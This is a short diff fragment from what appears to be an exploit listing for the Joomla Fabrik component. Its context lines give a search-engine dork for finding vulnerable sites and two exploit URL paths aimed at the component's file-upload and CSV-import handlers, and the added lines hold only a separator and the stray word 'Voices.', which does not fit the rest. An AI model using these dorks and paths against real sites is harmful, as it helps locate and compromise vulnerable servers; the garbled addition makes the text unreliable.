@@ -15,3 +15,7 @@ Dork: inurl:index.php?option=com_fabrik
 
 Exploit: /index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload
 Exploit: /index.php?option=com_fabrik&c=import&view=import&filetype=csv&table=1
+
+---
+
+Voices.
